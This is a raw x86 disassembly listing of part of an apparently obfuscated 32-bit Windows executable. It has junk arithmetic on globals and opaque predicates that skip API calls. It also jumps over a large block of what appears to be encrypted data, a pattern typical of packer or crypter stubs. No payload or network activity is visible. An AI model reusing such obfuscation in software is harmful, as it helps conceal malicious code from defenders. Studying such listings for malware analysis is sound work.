  41f822:	add    ecx,DWORD PTR ds:0x42837b
  41f828:	mov    ecx,DWORD PTR [ecx]
  41f82a:	add    DWORD PTR ds:0x428237,ecx
  41f830:	adc    DWORD PTR ds:0x42811f,edi
  41f836:	and    DWORD PTR ds:0x42835f,0x3101
  41f840:	mov    DWORD PTR ds:0x428367,0x28b7
  41f84a:	cmp    DWORD PTR ds:0x42812f,0x0
  41f851:	mov    ecx,DWORD PTR ds:0x42821f
  41f857:	mov    DWORD PTR ds:0x42820b,0x4504
  41f861:	mov    DWORD PTR ds:0x42833f,0x3c46
  41f86b:	mov    ecx,DWORD PTR ds:0x428363
  41f871:	jmp    0x41f8c3
  41f876:	mov    DWORD PTR ds:0x4282cf,ebx
  41f87c:	cmp    DWORD PTR ds:0x42812f,0x0
  41f883:	jge    0x41f8b3
  41f889:	push   0x1
  41f88b:	push   0x427f6c
  41f890:	push   0x427f76
  41f895:	call   DWORD PTR ds:0x428e6c
  41f89b:	and    DWORD PTR ds:0x428147,ebx
  41f8a1:	add    ecx,ecx
  41f8a3:	adc    DWORD PTR ds:0x4282cf,0x1bb
  41f8ad:	and    ecx,DWORD PTR ds:0x428363
  41f8b3:	sub    ecx,0x5232
  41f8b9:	sub    DWORD PTR ds:0x428137,0x6c90
  41f8c3:	mov    DWORD PTR [ebp-0x118],0x6083
  41f8cd:	or     DWORD PTR ds:0x428227,ebx
  41f8d3:	mov    DWORD PTR [ebp-0x88],0x556
  41f8dd:	mov    DWORD PTR [ebp-0x140],0x6c7d
  41f8e7:	mov    eax,DWORD PTR [ebp-0x140]
  41f8ed:	add    eax,0x5af8
  41f8f2:	xor    DWORD PTR ds:0x42833b,0x37e5
  41f8fc:	mov    ecx,DWORD PTR [ebp-0x88]
  41f902:	sub    DWORD PTR ds:0x428123,0x42835f
  41f90c:	sub    eax,ecx
  41f90e:	dec    DWORD PTR ds:0x428237
  41f914:	mov    ecx,DWORD PTR [ebp-0x118]
  41f91a:	lea    eax,[eax+ecx*1+0x68dc]
  41f921:	or     eax,0x52f6
  41f926:	adc    ecx,DWORD PTR ds:0x4281ef
  41f92c:	sub    eax,0x1dbfe
  41f931:	mov    DWORD PTR [ebp-0xac],eax
  41f937:	cmp    DWORD PTR ds:0x4282b3,0x0
  41f93e:	mov    DWORD PTR ds:0x4282c3,0x63c0
  41f948:	mov    DWORD PTR ds:0x428153,0x2316
  41f952:	mov    ecx,0x40fd
  41f957:	jmp    0x41f99f
  41f95c:	mov    eax,ds:0x42825f
  41f961:	mov    eax,0x5fd6
  41f966:	cmp    DWORD PTR ds:0x4282b3,0x0
  41f96d:	je     0x41f98d
  41f973:	call   DWORD PTR ds:0x428e70
  41f979:	sbb    DWORD PTR ds:0x428363,0x209
  41f983:	xor    DWORD PTR ds:0x428353,0x72db
  41f98d:	add    ecx,ecx
  41f98f:	and    DWORD PTR ds:0x42824f,0x6064
  41f999:	or     ecx,0x4aaa
  41f99f:	mov    DWORD PTR [ebp-0x6c],0x4b56
  41f9a6:	mov    DWORD PTR [ebp-0x100],0x49f7
  41f9b0:	xor    ecx,eax
  41f9b2:	mov    eax,DWORD PTR [ebp-0x100]
  41f9b8:	movzx  ecx,WORD PTR ds:0x428153
  41f9bf:	or     DWORD PTR ds:0x42833f,ecx
  41f9c5:	add    eax,0x7b60
  41f9ca:	cmp    DWORD PTR ds:0x4282b7,0x0
  41f9d1:	mov    DWORD PTR ds:0x4281fb,0x756d
  41f9db:	mov    DWORD PTR ds:0x4282b3,0x1d60
  41f9e5:	jmp    0x41fa41
  41f9ea:	mov    ecx,DWORD PTR ds:0x4282bb
  41f9f0:	cmp    DWORD PTR ds:0x4282b7,0x0
  41f9f7:	jg     0x41fa21
  41f9fd:	push   0x59e0
  41fa02:	call   DWORD PTR ds:0x428df4
  41fa08:	adc    DWORD PTR ds:0x42834f,ebx
  41fa0e:	sbb    DWORD PTR ds:0x4282d3,ebx
  41fa14:	movzx  ecx,WORD PTR ds:0x42832b
  41fa1b:	add    DWORD PTR ds:0x42833b,ecx
  41fa21:	add    DWORD PTR ds:0x428333,0x77eb
  41fa2b:	or     DWORD PTR ds:0x4282b3,0x2dfb
  41fa35:	mov    ecx,DWORD PTR ds:0x42825f
  41fa3b:	and    DWORD PTR ds:0x42811f,ecx
  41fa41:	imul   eax,eax,0x5ea
  41fa47:	mov    ecx,DWORD PTR [ebp-0x6c]
  41fa4a:	add    DWORD PTR ds:0x42820b,0x42814b
  41fa54:	imul   eax,ecx
  41fa57:	xor    edx,edx
  41fa59:	mov    ecx,0x3218d
  41fa5e:	div    ecx
  41fa60:	or     DWORD PTR ds:0x428253,edx
  41fa66:	sub    eax,0x24c1
  41fa6b:	mov    DWORD PTR [ebp-0xa8],eax
  41fa71:	cmp    DWORD PTR ds:0x428237,0x0
  41fa78:	mov    ecx,0x571f
  41fa7d:	mov    DWORD PTR ds:0x4282c7,edi
  41fa83:	jmp    0x41faef
  41fa88:	mov    eax,ds:0x428157
  41fa8d:	mov    DWORD PTR ds:0x42814f,0x4079
  41fa97:	cmp    DWORD PTR ds:0x428237,0x0
  41fa9e:	jb     0x41fac8
  41faa4:	push   0x428043
  41faa9:	push   DWORD PTR [ebp-0xc]
  41faac:	call   DWORD PTR ds:0x428df8
  41fab2:	adc    ecx,ecx
  41fab4:	dec    ecx
  41fab5:	movzx  ecx,BYTE PTR ds:0x428113
  41fabc:	sbb    ecx,DWORD PTR ds:0x42820b
  41fac2:	mov    DWORD PTR ds:0x428113,ecx
  41fac8:	xor    DWORD PTR ds:0x42825b,edx
  41face:	movzx  ecx,WORD PTR ds:0x428213
  41fad5:	or     DWORD PTR ds:0x4282ab,ecx
  41fadb:	xor    ecx,ecx
  41fadd:	add    ecx,DWORD PTR ds:0x42833b
  41fae3:	add    DWORD PTR ds:0x42824f,ecx
  41fae9:	and    ecx,DWORD PTR ds:0x42812b
  41faef:	mov    DWORD PTR [ebp-0x84],0x2c40
  41faf9:	cmp    DWORD PTR ds:0x42815b,0x0
  41fb00:	mov    ecx,DWORD PTR ds:0x4282bf
  41fb06:	mov    DWORD PTR ds:0x428343,edx
  41fb0c:	mov    DWORD PTR ds:0x42811f,ebx
  41fb12:	mov    DWORD PTR ds:0x4282c7,0x3231
  41fb1c:	jmp    0x41fb72
  41fb21:	not    eax
  41fb23:	cmp    DWORD PTR ds:0x42815b,0x0
  41fb2a:	jne    0x41fb54
  41fb30:	push   0x4d84
  41fb35:	push   0x8040
  41fb3a:	call   DWORD PTR ds:0x428dfc
  41fb40:	and    ecx,ecx
  41fb42:	mov    ecx,DWORD PTR ds:0x428363
  41fb48:	or     ecx,DWORD PTR ds:0x428233
  41fb4e:	mov    DWORD PTR ds:0x428363,ecx
  41fb54:	mov    ecx,DWORD PTR ds:0x42812b
  41fb5a:	add    ecx,DWORD PTR ds:0x428363
  41fb60:	mov    DWORD PTR ds:0x42812b,ecx
  41fb66:	sbb    DWORD PTR ds:0x42824b,ecx
  41fb6c:	adc    ecx,DWORD PTR ds:0x42825f
  41fb72:	mov    DWORD PTR [ebp-0x18],0x6013
  41fb79:	xor    ecx,DWORD PTR ds:0x42820f
  41fb7f:	mov    DWORD PTR [ebp-0x80],0xc
  41fb86:	or     DWORD PTR ds:0x428217,ecx
  41fb8c:	mov    eax,DWORD PTR [ebp-0x18]
  41fb8f:	sub    DWORD PTR ds:0x42814f,edi
  41fb95:	mov    ecx,DWORD PTR [ebp-0x80]
  41fb98:	or     DWORD PTR ds:0x428247,0x42824b
  41fba2:	xor    edx,edx
  41fba4:	xor    DWORD PTR ds:0x42835b,0x4282c3
  41fbae:	div    ecx
  41fbb0:	imul   eax,eax,0x4312
  41fbb6:	add    eax,0x5abe
  41fbbb:	cmp    DWORD PTR ds:0x42832f,0x0
  41fbc2:	mov    DWORD PTR ds:0x42815b,ebx
  41fbc8:	mov    DWORD PTR ds:0x428367,0x6142
  41fbd2:	jmp    0x41fc37
  41fbd7:	mov    DWORD PTR ds:0x428237,0x13f4
  41fbe1:	mov    DWORD PTR ds:0x428137,0x47aa
  41fbeb:	cmp    DWORD PTR ds:0x42832f,0x0
  41fbf2:	jne    0x41fc15
  41fbf8:	push   0x42809f
  41fbfd:	call   DWORD PTR ds:0x428e00
  41fc03:	and    ecx,DWORD PTR ds:0x428223
  41fc09:	adc    DWORD PTR ds:0x4282b3,ecx
  41fc0f:	sub    DWORD PTR ds:0x4282bb,edi
  41fc15:	mov    ecx,DWORD PTR ds:0x42832b
  41fc1b:	sbb    ecx,DWORD PTR ds:0x4281eb
  41fc21:	mov    DWORD PTR ds:0x42832b,ecx
  41fc27:	and    DWORD PTR ds:0x4282d3,0x55d2
  41fc31:	add    DWORD PTR ds:0x42814f,ecx
  41fc37:	mov    ecx,DWORD PTR [ebp-0x84]
  41fc3d:	adc    DWORD PTR ds:0x42823f,0x1028
  41fc47:	xor    eax,ecx
  41fc49:	or     ecx,DWORD PTR ds:0x42824f
  41fc4f:	xor    edx,edx
  41fc51:	or     ecx,DWORD PTR ds:0x42811b
  41fc57:	mov    ecx,0x5ae
  41fc5c:	sub    DWORD PTR ds:0x428237,0x4356
  41fc66:	div    ecx
  41fc68:	cmp    DWORD PTR ds:0x4281ef,0x0
  41fc6f:	mov    ecx,0x1d02
  41fc74:	mov    DWORD PTR ds:0x428253,ebx
  41fc7a:	mov    DWORD PTR ds:0x428267,0x2746
  41fc84:	mov    DWORD PTR ds:0x428237,edx
  41fc8a:	jmp    0x41fcee
  41fc8f:	mov    DWORD PTR ds:0x42812b,0x6e43
  41fc99:	cmp    DWORD PTR ds:0x4281ef,0x0
  41fca0:	jbe    0x41fccb
  41fca6:	push   0x29e8
  41fcab:	push   0x54b0
  41fcb0:	push   DWORD PTR [ebp-0x28]
  41fcb3:	call   DWORD PTR ds:0x428e74
  41fcb9:	neg    ecx
  41fcbb:	sbb    ecx,DWORD PTR ds:0x428363
  41fcc1:	and    DWORD PTR ds:0x42812b,0x4282df
  41fccb:	mov    ecx,DWORD PTR ds:0x428133
  41fcd1:	xor    DWORD PTR ds:0x4281ff,ecx
  41fcd7:	movzx  ecx,BYTE PTR ds:0x428247
  41fcde:	sub    DWORD PTR ds:0x428353,ecx
  41fce4:	mov    DWORD PTR ds:0x428203,0x7a81
  41fcee:	xor    eax,0x5e8c
  41fcf3:	adc    ecx,0x10d9
  41fcf9:	mov    DWORD PTR [ebp-0x48],eax
  41fcfc:	mov    DWORD PTR [ebp-0x13c],0x7b18
  41fd06:	mov    eax,ds:0x428367
  41fd0b:	add    eax,DWORD PTR ds:0x42812f
  41fd11:	mov    ds:0x428367,eax
  41fd16:	mov    DWORD PTR [ebp-0x138],0x1169
  41fd20:	xor    ecx,ecx
  41fd22:	mov    DWORD PTR [ebp-0x12c],0x1379
  41fd2c:	cmp    DWORD PTR ds:0x4282d3,0x0
  41fd33:	mov    ecx,DWORD PTR ds:0x4282bb
  41fd39:	mov    ecx,DWORD PTR ds:0x42834b
  41fd3f:	mov    ecx,0x2973
  41fd44:	movzx  ecx,WORD PTR ds:0x4281eb
  41fd4b:	jmp    0x41fd9c
  41fd50:	mov    eax,0x21a8
  41fd55:	mov    eax,0x38ee
  41fd5a:	cmp    DWORD PTR ds:0x4282d3,0x0
  41fd61:	ja     0x41fd84
  41fd67:	push   DWORD PTR [ebp-0x20]
  41fd6a:	call   DWORD PTR ds:0x428e04
  41fd70:	and    ecx,ecx
  41fd72:	xor    DWORD PTR ds:0x428233,0x6e97
  41fd7c:	add    ecx,ecx
  41fd7e:	or     DWORD PTR ds:0x42820f,edx
  41fd84:	mov    ecx,DWORD PTR ds:0x428273
  41fd8a:	mov    ecx,DWORD PTR [ecx]
  41fd8c:	sbb    DWORD PTR ds:0x42825f,ecx
  41fd92:	sbb    DWORD PTR ds:0x428353,0x4282db
  41fd9c:	mov    eax,DWORD PTR [ebp-0x12c]
  41fda2:	mov    ecx,0x5856
  41fda7:	sub    ecx,eax
  41fda9:	shr    ecx,0x2
  41fdac:	sub    ecx,0x5be6
  41fdb2:	xor    eax,0xe7a
  41fdb7:	mov    eax,DWORD PTR [ebp-0x138]
  41fdbd:	imul   ecx,eax
  41fdc0:	mov    eax,DWORD PTR [ebp-0x13c]
  41fdc6:	sbb    DWORD PTR ds:0x4282cf,0x4282d3
  41fdd0:	and    ecx,eax
  41fdd2:	xor    DWORD PTR ds:0x42813f,edx
  41fdd8:	mov    eax,0x3b18
  41fddd:	sub    eax,ecx
  41fddf:	mov    DWORD PTR [ebp-0xfc],eax
  41fde5:	mov    DWORD PTR [ebp-0x28],0x16d7
  41fdec:	mov    DWORD PTR [ebp-0x134],0x6b4
  41fdf6:	sub    eax,DWORD PTR ds:0x42832f
  41fdfc:	mov    eax,DWORD PTR [ebp-0x134]
  41fe02:	xor    ecx,0x2b1a
  41fe08:	or     eax,0x4f70
  41fe0d:	xor    ecx,ecx
  41fe0f:	add    ecx,DWORD PTR ds:0x42832f
  41fe15:	xor    DWORD PTR ds:0x428337,ecx
  41fe1b:	mov    ecx,DWORD PTR [ebp-0x28]
  41fe1e:	or     eax,ecx
  41fe20:	sub    eax,0x5ff7
  41fe25:	mov    DWORD PTR [ebp-0xc8],eax
  41fe2b:	adc    eax,ecx
  41fe2d:	mov    DWORD PTR [ebp-0xe4],0x5f39
  41fe37:	sub    ecx,ecx
  41fe39:	mov    DWORD PTR [ebp-0xc4],0x6236
  41fe43:	mov    DWORD PTR [ebp-0x7c],0x6ce7
  41fe4a:	cmp    DWORD PTR ds:0x42812f,0x0
  41fe51:	not    DWORD PTR ds:0x42825b
  41fe57:	mov    DWORD PTR ds:0x4281f7,edx
  41fe5d:	jmp    0x41feb6
  41fe62:	mov    eax,0x4320
  41fe67:	cmp    DWORD PTR ds:0x42812f,0x0
  41fe6e:	jne    0x41fe8d
  41fe74:	push   DWORD PTR [ebp-0x28]
  41fe77:	call   DWORD PTR ds:0x428e08
  41fe7d:	and    DWORD PTR ds:0x428347,0x4195
  41fe87:	add    ecx,DWORD PTR ds:0x4281ff
  41fe8d:	movzx  ecx,WORD PTR ds:0x4282d7
  41fe94:	and    DWORD PTR ds:0x4282b3,ecx
  41fe9a:	and    DWORD PTR ds:0x428227,edx
  41fea0:	add    ecx,0x2485
  41fea6:	mov    eax,ds:0x42816b
  41feab:	mov    ecx,DWORD PTR ds:0x42839f
  41feb1:	sub    ecx,eax
  41feb3:	and    eax,DWORD PTR [eax+ecx*1]
  41feb6:	mov    DWORD PTR [ebp-0x128],0x7537
  41fec0:	not    ecx
  41fec2:	mov    DWORD PTR [ebp-0x114],0x6985
  41fecc:	movzx  ecx,BYTE PTR ds:0x42814f
  41fed3:	or     DWORD PTR ds:0x428363,ecx
  41fed9:	mov    DWORD PTR [ebp-0x14],0x5627
  41fee0:	cmp    DWORD PTR ds:0x42822b,0x0
  41fee7:	mov    ecx,0x306f
  41feec:	mov    DWORD PTR ds:0x42832f,0x1b86
  41fef6:	jmp    0x41ff30
  41fefb:	mov    eax,0x6a49
  41ff00:	mov    DWORD PTR ds:0x4282ab,ecx
  41ff06:	cmp    DWORD PTR ds:0x42822b,0x0
  41ff0d:	jae    0x41ff28
  41ff13:	push   0x428113
  41ff18:	call   DWORD PTR ds:0x428e78
  41ff1e:	or     ecx,DWORD PTR ds:0x428133
  41ff24:	and    ecx,ecx
  41ff26:	adc    ecx,ecx
  41ff28:	adc    DWORD PTR ds:0x4282d7,ecx
  41ff2e:	sbb    ecx,ecx
  41ff30:	mov    DWORD PTR [ebp-0x64],0x72e7
  41ff37:	mov    eax,DWORD PTR [ebp-0x14]
  41ff3a:	and    DWORD PTR ds:0x4281fb,edi
  41ff40:	add    eax,DWORD PTR [ebp-0x64]
  41ff43:	jmp    0x42029f
  41ff48:	test   DWORD PTR [edx],edi
  41ff4a:	cmp    BYTE PTR [eax+0x2e],ah
  41ff4d:	pop    edx
  41ff4e:	cmp    eax,0x6ff09f1a
  41ff53:	mov    al,0x2f
  41ff55:	jle    0x41ff22
  41ff57:	jo     0x41ff7c
  41ff59:	and    edx,DWORD PTR [esi]
  41ff5b:	sbb    BYTE PTR [ebx+0x27181812],ah
  41ff61:	ret    0x30e6
  41ff64:	in     al,0xf9
  41ff66:	in     eax,0xf9
  41ff68:	xchg   esp,eax
  41ff69:	test   eax,0xab68d21e
  41ff6e:	sub    ecx,0x870f3c5c
  41ff74:	imul   eax,DWORD PTR [eax-0x6d2f1862],0x32
  41ff7b:	cmp    al,0x75
  41ff7d:	inc    esp
  41ff7e:	inc    esp
  41ff7f:	mov    fs,WORD PTR [eax-0x73]
  41ff82:	rcl    DWORD PTR [eax-0x27],cl
  41ff85:	in     al,0x18
  41ff87:	int    0x7d
  41ff89:	cdq    
  41ff8a:	sub    bl,BYTE PTR [ecx+0xd9bb283]
  41ff90:	repnz sbb esp,edi
  41ff93:	or     BYTE PTR [ecx-0x4d],dh
  41ff96:	inc    esi
  41ff97:	pop    es
  41ff98:	adc    ebp,edx
  41ff9a:	xor    al,0x8e
  41ff9c:	cmp    eax,0x94f11b89
  41ffa1:	cwde   
  41ffa2:	dec    esi
  41ffa3:	push   ebp
  41ffa4:	je     0x41ff41
  41ffa6:	ret    
  41ffa7:	lock stos BYTE PTR es:[edi],al
  41ffa9:	loope  0x41ffb2
  41ffab:	lahf   
  41ffac:	xchg   edx,eax
  41ffad:	(bad)  
  41ffaf:	int    0x50
  41ffb1:	push   0xa314814f
  41ffb6:	dec    esi
  41ffb7:	gs call 0x6b2a:0x3f2e6aa6
  41ffbf:	push   ecx
  41ffc0:	or     eax,0x860c2623
  41ffc5:	adc    al,BYTE PTR [ebx+0x65]
  41ffc8:	(bad)  
  41ffc9:	or     eax,0xcead71d1
  41ffce:	xchg   edi,eax
  41ffcf:	stos   BYTE PTR es:[edi],al
  41ffd0:	(bad)  
  41ffd1:	cwde   
  41ffd2:	pop    eax
  41ffd3:	jle    0x42000e
  41ffd5:	cld    
  41ffd6:	mov    bh,al
  41ffd8:	fnstsw WORD PTR [eax+edx*1+0x70]
  41ffdc:	pop    edi
  41ffdd:	mov    bh,0xa5
  41ffdf:	pop    ecx
  41ffe0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ffe1:	std    
  41ffe2:	jbe    0x420021
  41ffe4:	bound  ebp,QWORD PTR [edi+0x436ab434]
  41ffea:	ret    
  41ffeb:	jo     0x41ffe2
  41ffed:	in     al,dx
  41ffee:	lods   eax,DWORD PTR ds:[esi]
  41ffef:	js     0x41fff2
  41fff1:	cmp    ecx,eax
  41fff3:	sub    dl,BYTE PTR [edi+0x7c]
  41fff6:	outs   dx,DWORD PTR ds:[esi]
  41fff7:	pop    ss
  41fff8:	addr16 cli 
  41fffa:	inc    ebx
  41fffb:	retf   0xba2f
  41fffe:	mov    bl,0xb7
  420000:	stc    
  420001:	stc    
  420002:	pop    edi
  420003:	je     0x420070
  420005:	(bad)  [edx]
  420007:	jmp    0x97a5981b
  42000c:	call   0x1973f22f
  420011:	push   ebp
  420012:	pop    ecx
  420013:	or     DWORD PTR [edx+0x6],eax
  420016:	sub    al,0x76
  420018:	enter  0xd9e0,0xab
  42001c:	(bad)  
  42001d:	mov    edi,0x99174c75
  420022:	dec    ebp
  420023:	sahf   
  420024:	dec    edx
  420025:	(bad)  
  420027:	pop    esp
  420028:	call   DWORD PTR [esi+0x69]
  42002b:	and    dh,BYTE PTR [edx]
  42002d:	lds    edx,FWORD PTR ds:0x3c036435
  420033:	out    0x7,al
  420035:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420036:	clc    
  420037:	cdq    
  420038:	inc    esi
  420039:	nop
  42003a:	repz aas 
  42003c:	cmc    
  42003d:	push   edi
  42003e:	js     0x42002d
  420040:	sub    DWORD PTR [eax+eiz*4+0x36e9bbd9],edx
  420047:	aaa    
  420048:	inc    eax
  420049:	mov    bl,0x7c
  42004b:	mov    al,ds:0x2a48e40a
  420050:	test   BYTE PTR [ecx+esi*8-0x7930302d],dh
  420057:	call   FWORD PTR [edx-0x17687d1e]
  42005d:	inc    eax
  42005e:	sbb    BYTE PTR [ecx+0x60],bl
  420061:	adc    ebp,edx
  420063:	and    BYTE PTR [ebp+eiz*2+0x6bddfcdf],0x95
  42006b:	dec    esi
  42006c:	sbb    dh,ah
  42006e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42006f:	sbb    DWORD PTR [edx+0x6e002a6b],edx
  420075:	xchg   ecx,eax
  420076:	clc    
  420077:	iret   
  420078:	les    edi,FWORD PTR [esp+ecx*2]
  42007b:	mov    eax,0x60076583
  420080:	retf   
  420081:	aam    0x4e
  420083:	ret    
  420084:	dec    esi
  420085:	xchg   ebp,eax
  420086:	add    bh,bl
  420088:	adc    eax,0x767ddb6a
  42008d:	scas   al,BYTE PTR es:[edi]
  42008e:	mov    edi,0xdbb7e336
  420093:	jl     0x4200d7
  420095:	fdivr  QWORD PTR [ecx+0x69]
  420098:	dec    ebp
  420099:	frstor [edi-0x77]
  42009c:	in     al,dx
  42009d:	jecxz  0x420080
  42009f:	push   edi
  4200a0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4200a1:	mov    ah,BYTE PTR [edi-0x34]
  4200a4:	inc    ebp
  4200a5:	cmp    al,0xcb
  4200a7:	xor    eax,0x3d64355e
  4200ac:	scas   eax,DWORD PTR es:[edi]
  4200ad:	pushf  
  4200ae:	jp     0x420054
  4200b0:	sub    DWORD PTR [edi-0x1b],edi
  4200b3:	pop    esi
  4200b4:	sbb    DWORD PTR [edx],ebp
  4200b6:	aas    
  4200b7:	add    al,BYTE PTR [edx+0x1c6bf58f]
  4200bd:	fs daa 
  4200bf:	or     DWORD PTR [ecx+0x2887093],eax
  4200c5:	dec    ebx
  4200c6:	pop    es
  4200c7:	pop    edx
  4200c8:	push   edx
  4200c9:	shl    DWORD PTR [ebp-0x4a],1
  4200cc:	or     al,0x80
  4200ce:	and    BYTE PTR [ecx-0x60477376],ah
  4200d4:	jne    0x4200d6
  4200d6:	xchg   esi,eax
  4200d7:	mov    esp,0x1e49e69
  4200dc:	xchg   esp,eax
  4200dd:	fnsave [ebx]
  4200df:	cld    
  4200e0:	mov    edi,0xdd83edd
  4200e5:	xor    al,0x37
  4200e7:	xchg   ebp,eax
  4200e8:	jge    0x4200d9
  4200ea:	mov    bl,0x55
  4200ec:	or     eax,0xfa36b3dd
  4200f1:	xor    DWORD PTR [ecx+0xf4315a],0x41d44717
  4200fb:	add    BYTE PTR [ebx+0x35],0x92
  4200ff:	in     al,0x6e
  420101:	and    eax,0xa4976044
  420106:	pop    ds
  420107:	mov    al,ds:0x7598b256
  42010c:	mov    eax,0xb7adc2ac
  420111:	test   DWORD PTR [ebx],edi
  420113:	or     BYTE PTR [eax+0xf],0x77
  420117:	fcmovne st,st(3)
  420119:	je     0x420137
  42011b:	inc    esp
  42011c:	sub    ch,BYTE PTR [ecx]
  42011e:	or     dh,BYTE PTR [ecx]
  420120:	pop    ds
  420121:	repz sub DWORD PTR [edx+esi*8-0x4263b5de],0x31
  42012a:	dec    ebx
  42012b:	or     al,0x5
  42012d:	jns    0x42011a
  42012f:	mov    ds:0x4ac77dee,al
  420134:	inc    BYTE PTR [edi-0x45d5dc07]
  42013a:	iret   
  42013b:	es jecxz 0x420163
  42013e:	ret    
  42013f:	add    BYTE PTR ds:0x4859062d,dl
  420145:	pop    ds
  420146:	sub    al,0xf7
  420148:	add    al,0xf7
  42014a:	call   0xeb6f42d0
  42014f:	jl     0x420162
  420151:	sbb    cl,0x93
  420154:	shr    DWORD PTR [ebp-0x3b],0x1b
  420158:	pop    ss
  420159:	pushf  
  42015a:	das    
  42015b:	sub    ah,BYTE PTR [edx+0x45]
  42015e:	sub    DWORD PTR [ecx],edx
  420160:	jne    0x420103
  420162:	out    0x54,al
  420164:	addr16 mov esp,0x7450b764
  42016a:	jbe    0x42013a
  42016c:	xchg   ebp,eax
  42016d:	xor    esi,DWORD PTR ds:0x2e96b7b0
  420173:	mov    BYTE PTR [edi],dl
  420175:	ret    0x41c0
  420178:	mov    edx,0xe00866af
  42017d:	inc    esp
  42017e:	outs   dx,BYTE PTR ds:[esi]
  42017f:	jno    0x42019f
  420181:	add    BYTE PTR [eax],al
  420183:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420184:	add    eax,0x826057b7
  420189:	or     dh,bl
  42018b:	adc    edx,DWORD PTR [eax-0x8]
  42018e:	sub    ch,BYTE PTR [eax-0x3e2128ad]
  420194:	ror    DWORD PTR [edx],cl
  420196:	inc    esp
  420197:	test   al,0xef
  420199:	xchg   DWORD PTR [ebx-0x42e9bb42],ebp
  42019f:	sub    ebx,ecx
  4201a1:	cli    
  4201a2:	xor    al,0x7f
  4201a4:	lods   al,BYTE PTR ds:[esi]
  4201a5:	jmp    0x3aef:0xbcec0665
  4201ac:	pop    esi
  4201ad:	mov    DWORD PTR [ecx+0x2d],ecx
  4201b0:	ja     0x420216
  4201b2:	sub    al,0xa7
  4201b4:	int    0xc1
  4201b6:	lods   al,BYTE PTR ds:[esi]
  4201b7:	call   0x4e0d:0x2f647783
  4201be:	adc    eax,0x640f6ff4
  4201c3:	inc    edx
  4201c4:	xor    al,0x4d
  4201c6:	cmp    al,0xd1
  4201c8:	(bad)  [ebp-0x6b]
  4201cb:	xchg   edi,eax
  4201cc:	pop    ebx
  4201cd:	dec    eax
  4201ce:	loope  0x420217
  4201d0:	sub    esp,ecx
  4201d2:	sbb    DWORD PTR [eax+0x1ab630c0],edx
  4201d8:	stos   DWORD PTR es:[edi],eax
  4201d9:	and    DWORD PTR [edx],esp
  4201db:	mov    ds:0xd0119164,eax
  4201e0:	rcr    DWORD PTR [esi],cl
  4201e2:	leave  
  4201e3:	in     eax,0x9b
  4201e5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4201e6:	jne    0x4201e7
  4201e8:	cmp    bh,BYTE PTR [edx+esi*1]
  4201eb:	retf   
  4201ec:	sub    al,0x8b
  4201ee:	pop    esp
  4201ef:	sub    dh,BYTE PTR [ebx]
  4201f1:	add    al,0xc9
  4201f3:	shr    esi,1
  4201f5:	cld    
  4201f6:	inc    esp
  4201f7:	outs   dx,BYTE PTR ds:[esi]
  4201f8:	rcl    DWORD PTR [ebp-0x33d02930],cl
  4201fe:	jo     0x420200
  420200:	mov    edi,0x836ff73a
  420205:	sbb    eax,0x5f90e9a4
  42020a:	add    DWORD PTR [edi-0x7],0xffffffff
  42020e:	cmp    eax,0x6cbbdabc
  420213:	pop    ebx
  420214:	sub    ecx,DWORD PTR [ecx-0x9c98af5]
  42021a:	arpl   WORD PTR [edx+ebx*2+0x74871899],sp
  420221:	fwait
  420222:	push   ds
  420223:	into   
  420224:	enter  0x9b25,0x98
  420228:	mov    DWORD PTR [edx],edx
  42022a:	pop    DWORD PTR [ecx-0x4a]
  42022d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42022e:	lods   eax,DWORD PTR ds:[esi]
  42022f:	xchg   ebx,eax
  420230:	or     BYTE PTR [esi-0x7d201698],ah
  420236:	out    0x4c,al
  420238:	out    0x16,eax
  42023a:	sbb    al,0x72
  42023c:	sbb    edx,0x14
  42023f:	mov    edi,0xc086f4cf
  420244:	jge    0x42024c
  420246:	dec    esp
  420247:	(bad)  
  420249:	dec    edx
  42024a:	push   edx
  42024b:	jp     0x42028c
  42024d:	hlt    
  42024e:	xor    BYTE PTR [eax-0x13],bl
  420251:	mov    esp,0xa13ce4d4
  420256:	mov    edi,0x47d909f9
  42025b:	push   ebx
  42025c:	cmp    al,0x85
  42025e:	fstp   QWORD PTR [ebx+0x2bec90f5]
  420264:	adc    DWORD PTR [edx+ebp*1+0x3d],0x31c4f7d3
  42026c:	push   0x25e661c4
  420271:	mov    ds:0x571e8ea7,al
  420276:	adc    BYTE PTR [eax],dh
  420278:	outs   dx,BYTE PTR ds:[esi]
  420279:	and    DWORD PTR [ebp-0x7e],0xffffffb6
  42027d:	ret    0x3f34
  420280:	outs   dx,DWORD PTR ds:[esi]
  420281:	dec    ecx
  420282:	cmp    dh,BYTE PTR [ecx+ecx*1-0x5b]
  420286:	(bad)  
  420287:	jle    0x420253
  420289:	push   ebx
  42028a:	fs in  eax,dx
  42028c:	adc    al,0xac
  42028e:	cwde   
  42028f:	int3   
  420290:	loope  0x42028c
  420292:	pop    es
  420293:	mov    dl,0x52
  420295:	xchg   esi,eax
  420296:	test   eax,0xba46c8b0
  42029b:	jnp    0x4202ee
  42029d:	jmp    0x42022c
  42029f:	mov    ecx,DWORD PTR [ebp-0x114]
  4202a5:	or     DWORD PTR ds:0x42824f,0x4282cb
  4202af:	sub    eax,ecx
  4202b1:	mov    ecx,DWORD PTR ds:0x428347
  4202b7:	add    DWORD PTR ds:0x4282cf,ecx
  4202bd:	mov    ecx,DWORD PTR [ebp-0x128]
  4202c3:	imul   eax,ecx
  4202c6:	imul   eax,eax,0xe4e
  4202cc:	mov    ecx,DWORD PTR [ebp-0x7c]
  4202cf:	or     eax,ecx
  4202d1:	and    DWORD PTR ds:0x42834b,ebx
  4202d7:	mov    ecx,DWORD PTR [ebp+0x8]
  4202da:	sub    DWORD PTR ds:0x428127,0x428247
  4202e4:	lea    eax,[ecx+eax*1+0x46210209]
  4202eb:	add    DWORD PTR ds:0x42833b,0x42811f
  4202f5:	push   eax
  4202f6:	add    DWORD PTR ds:0x428233,0x4281eb
  420300:	call   0x414116
  420305:	cmp    DWORD PTR ds:0x4282cb,0x0
  42030c:	mov    DWORD PTR ds:0x428223,edx
  420312:	mov    esi,DWORD PTR ds:0x4281eb
  420318:	mov    DWORD PTR ds:0x4282c7,ebx
  42031e:	mov    DWORD PTR ds:0x4282d7,0x5564
